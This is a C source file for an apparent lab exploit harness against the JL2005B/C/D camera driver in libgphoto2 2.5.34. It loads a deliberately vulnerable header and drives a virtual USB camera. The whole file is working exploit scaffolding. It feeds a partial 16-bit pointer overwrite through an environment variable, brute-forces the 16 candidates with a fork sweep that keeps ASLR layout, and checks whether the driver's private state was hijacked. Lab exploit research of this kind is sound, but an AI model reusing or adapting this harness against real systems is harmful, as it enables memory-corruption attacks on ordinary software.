/* W193 lab probe: real clang-built libgphoto2 2.5.34 plus vusb mode r.
 * Only a 16-bit partial value is supplied for the spilled priv pointer.
 * The optional fork sweep gives all 16 candidates the same inherited ASLR
 * and heap layout; it is a lab model for repeated attempts in one process. */
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <gphoto2/gphoto2.h>
#include <gphoto2/gphoto2-port-info-list.h>
#include "jl2005c.h.vuln"

extern char **environ;
static Camera *g_cam;
static int g_hi = -1;

static void on_segv(int sig)
{
	(void)sig;
	printf("SIGSEGV PARTIAL=%s CAM_PL=%p\n",
	       getenv("M2SHELL_JL2005_PRIV16") ? getenv("M2SHELL_JL2005_PRIV16") : "-",
	       g_cam ? (void *)g_cam->pl : NULL);
	fflush(stdout);
	_exit(139);
}

static int set_candidate(int hi)
{
	const char prefix[] = "M2SHELL_JL2005_PRIV16=";
	char value[7];
	char **e;
	snprintf(value, sizeof(value), "0x%x430", hi);
	for (e = environ; *e; e++) {
		if (!strncmp(*e, prefix, sizeof(prefix)-1)) {
			memcpy(*e + sizeof(prefix)-1, value, sizeof(value)-1);
			g_hi = hi;
			return 0;
		}
	}
	return -1;
}

int main(int argc, char **argv)
{
	CameraAbilitiesList *al = NULL;
	CameraAbilities ab;
	GPPortInfoList *il = NULL;
	GPPortInfo pi;
	const char *path = argc > 1 ? argv[1] : "usb:001,001";
	int m, idx, rc, i, child = 0;

	setvbuf(stdout, NULL, _IONBF, 0);
	signal(SIGSEGV, on_segv);
	if (gp_camera_new(&g_cam) < GP_OK) return 2;
	if (gp_abilities_list_new(&al) < GP_OK) return 2;
	if (gp_abilities_list_load(al, NULL) < GP_OK) return 2;
	m = gp_abilities_list_lookup_model(al, " JL2005B/C/D camera");
	if (m < 0) return 2;
	if (gp_abilities_list_get_abilities(al, m, &ab) < GP_OK) return 2;
	if (gp_camera_set_abilities(g_cam, ab) < GP_OK) return 2;
	if (gp_port_info_list_new(&il) < GP_OK) return 2;
	if (gp_port_info_list_load(il) < GP_OK) return 2;
	idx = gp_port_info_list_lookup_path(il, path);
	if (idx < 0) return 2;
	if (gp_port_info_list_get_info(il, idx, &pi) < GP_OK) return 2;
	if (gp_camera_set_port_info(g_cam, pi) < GP_OK) return 2;

	if (getenv("M2SHELL_JL2005_FORK_SWEEP")) {
		int hi;
		setenv("M2SHELL_JL2005_PRIV16", "0x0430", 1);
		for (hi = 0; hi < 16; hi++) {
			pid_t pid = fork();
			int status;
			if (pid < 0) return 7;
			if (pid == 0) {
				if (set_candidate(hi) < 0) _exit(8);
				child = 1;
				break;
			}
			waitpid(pid, &status, 0);
		}
		if (!child) _exit(0);
	}

	rc = gp_camera_init(g_cam, NULL);
	printf("AFTER_INIT rc=%d CAM_PL=%p MODEL=%02x NB=%d BLOCK=%x TOTAL=%lx DATA=%p\n",
	       rc, (void *)g_cam->pl, g_cam->pl ? g_cam->pl->model : 0,
	       g_cam->pl ? g_cam->pl->nb_entries : -1,
	       g_cam->pl ? g_cam->pl->blocksize : 0,
	       g_cam->pl ? g_cam->pl->total_data_in_camera : 0,
	       g_cam->pl ? (void *)g_cam->pl->data_cache : NULL);
	if (rc < GP_OK) return 3;
	printf("TABLE_DIRECT=");
	for (i = 0; i < 16; i++) printf("%02x", g_cam->pl->table[i]);
	printf("\n");
	if (rc == GP_OK && g_cam->pl->model == 0x43 &&
	    g_cam->pl->nb_entries == 1 && g_cam->pl->blocksize == 0x200 &&
	    g_cam->pl->total_data_in_camera == 0x200 &&
	    memcmp(g_cam->pl->table, "W193", 4) == 0) {
		printf("DIRECT_RESULT=1");
		if (g_hi >= 0) printf(" SWEEP_HIT=%x", g_hi);
		printf("\n");
		fflush(stdout);
		_exit(0);
	}
	printf("DIRECT_RESULT=0\n");
	fflush(stdout);
	_exit(g_cam->pl->nb_entries == 100 ? 0 : 6);
}
